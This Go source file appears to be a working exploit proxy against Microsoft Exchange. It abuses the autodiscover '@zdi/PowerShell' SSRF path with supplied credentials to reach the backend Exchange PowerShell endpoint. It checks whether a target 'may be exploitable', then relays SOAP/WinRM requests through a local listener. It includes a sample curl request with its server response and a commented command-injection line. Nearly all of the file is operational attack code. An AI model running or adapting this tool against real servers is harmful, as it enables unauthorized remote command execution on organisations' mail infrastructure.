package main

import (
	"bytes"
	"encoding/base64"
	"errors"
	"flag"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

var httpClientTimeout = 15 * time.Second
var dialTimeout = 7 * time.Second
var httpClient = &fasthttp.Client{
	ReadTimeout:    7 * time.Second,
	ReadBufferSize: 1024 * 8,
	Dial: func(addr string) (net.Conn, error) {
		// no suitable address found => ipv6 can not dial to ipv4,..
		hostname, port, err := net.SplitHostPort(addr)
		if err != nil {
			if err1, ok := err.(*net.AddrError); ok && strings.Index(err1.Err, "missing port") != -1 {
				hostname, port, err = net.SplitHostPort(strings.TrimRight(addr, ":") + ":80")
			}
			if err != nil {
				return nil, err
			}
		}
		if port == "" || port == ":" {
			port = "80"
		}
		return fasthttp.DialDualStackTimeout("["+hostname+"]:"+port, dialTimeout)
	},
}

var errEncodingNotSupported = errors.New("response content encoding not supported")

func getResponseBody(resp *fasthttp.Response) ([]byte, error) {
	var contentEncoding = resp.Header.Peek("Content-Encoding")
	if len(contentEncoding) < 1 {
		return resp.Body(), nil
	}
	if bytes.Equal(contentEncoding, []byte("gzip")) {
		return resp.BodyGunzip()
	}
	if bytes.Equal(contentEncoding, []byte("deflate")) {
		return resp.BodyInflate()
	}
	return nil, errEncodingNotSupported
}

var listen = flag.String(`listen`, `:11337`, `Listen address. Eg: :8443; unix:/tmp/proxy.sock`)

func main() {
	flag.Parse()

	// Setup
	basicAuth = base64.StdEncoding.EncodeToString([]byte(*username + `:` + *password))
	doCheck()

	// Server
	var err error
	var ln net.Listener
	if strings.HasPrefix(*listen, `unix:`) {
		unixFile := (*listen)[5:]
		os.Remove(unixFile)
		ln, err = net.Listen(`unix`, unixFile)
		os.Chmod(unixFile, os.ModePerm)
		log.Println(`Listening:`, unixFile)
	} else {
		ln, err = net.Listen(`tcp`, *listen)
		log.Println(`Listening:`, ln.Addr().String())
	}
	if err != nil {
		log.Panicln(err)
	}
	srv := &fasthttp.Server{
		// ErrorHandler: nil,
		Handler:               requestHandler,
		NoDefaultServerHeader: true, // Don't send Server: fasthttp
		// Name: "nginx",  // Send Server header
		ReadBufferSize:                2 * 4096, // Make sure these are big enough.
		WriteBufferSize:               4096,
		ReadTimeout:                   5 * time.Second,
		WriteTimeout:                  time.Second,
		IdleTimeout:                   time.Minute, // This can be long for keep-alive connections.
		DisableHeaderNamesNormalizing: false,       // If you're not going to look at headers or know the casing you can set this.
		// NoDefaultContentType: true, // Don't send Content-Type: text/plain if no Content-Type is set manually.
		MaxRequestBodySize: 200 * 1024 * 1024, // 200MB
		DisableKeepalive:   false,
		KeepHijackedConns:  false,
		// NoDefaultDate: len(*staticDir) == 0,
		ReduceMemoryUsage: true,
		TCPKeepalive:      true,
		// TCPKeepalivePeriod: 10 * time.Second,
		// MaxRequestsPerConn: 1000,
		// MaxConnsPerIP: 20,
	}
	log.Panicln(srv.Serve(ln))
}

var target = flag.String(`target`, `https://mail.domain.corp`, `Target`)
var username = flag.String(`user`, `user@domain.corp`, `Username`)
var password = flag.String(`pass`, `passwd`, `Password`)

var basicAuth = ``
var backendDomain []byte

func doCheck() {
	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	req.URI().Update(*target)
	req.URI().Update(`/autodiscover/autodiscover.json?@zdi/PowerShell?serializationLevel=Full;ExchClientVer=15.2.922.7;clientApplication=ManagementShell;TargetServer=;PSVersion=5.1.17763.592&Email=autodiscover/autodiscover.json%3F@zdi`)
	req.Header.Set("Authorization", "Basic "+basicAuth)
	req.Header.Set("User-Agent", "-")
	req.Header.Set("Accept", "*/*")

	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseResponse(resp)
	err := httpClient.DoTimeout(req, resp, httpClientTimeout)
	if err != nil {
		log.Println(err)
	}
	log.Println(req.String())
	log.Println(resp.String())

	lookGood := false
	resp.Header.VisitAllCookie(func(key, value []byte) {
		if strings.ToLower(string(key)) == `x-backendcookie` {
			lookGood = true
			return
		}
	})
	backendDomain = []byte(string(resp.Header.Peek(`X-Calculatedbetarget`)))

	if resp.StatusCode() == 200 && lookGood {
		log.Println("Look good, may be exploitable:", string(backendDomain))
	} else {
		log.Println("May be not exploitable!")
	}
}

// go build && ./mitm -target https://mail.domain.corp -user 'user@domain.corp' -pass 'passwd'
/*
curl -v 'https://mail.domain.corp/autodiscover/autodiscover.json?@zdi/PowerShell?serializationLevel=Full;ExchClientVer=15.2.922.7;clientApplication=ManagementShell;TargetServer=;PSVersion=5.1.17763.592&Email=autodiscover/autodiscover.json%3F@zdi'

HTTP/2 401
cache-control: private
server: Microsoft-IIS/10.0
request-id: e379a219-4853-478b-ab37-842e5e5915b9
x-calculatedbetarget: ex19-01.domain.corp
x-aspnet-version: 4.0.30319
x-owa-version: 15.2.986.14
www-authenticate: Negotiate
www-authenticate: NTLM
x-powered-by: ASP.NET
x-feserver: EX19-01
www-authenticate: Basic realm="mail.domain.corp"
date: Sun, 18 Dec 2022 10:12:35 GMT
content-length: 0
*/
func requestHandler(ctx *fasthttp.RequestCtx) {
	req := &ctx.Request
	req.URI().Update(*target)
	req.URI().Update(`/autodiscover/autodiscover.json?@zdi/PowerShell?serializationLevel=Full;ExchClientVer=15.2.922.7;clientApplication=ManagementShell;TargetServer=;PSVersion=5.1.17763.592&Email=autodiscover/autodiscover.json%3F@zdi`)
	req.Header.Set("Authorization", "Basic "+basicAuth)
	req.Header.Set("User-Agent", "-")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Content-Type", "application/soap+xml;charset=UTF-8")

	body := req.Body()
	body = bytes.ReplaceAll(body, []byte(`127.0.0.1:11337`), backendDomain)
	// body = bytes.ReplaceAll(body, []byte(`<rsp:Command />`), []byte(`<rsp:Command>New-OfflineAddressBook</rsp:Command>`))

	req.SetBody(body)

	err := httpClient.DoTimeout(req, &ctx.Response, httpClientTimeout)
	if err != nil {
		log.Println(err)
		return
	}
	log.Println(req.String())
	log.Println(ctx.Response.String())
}
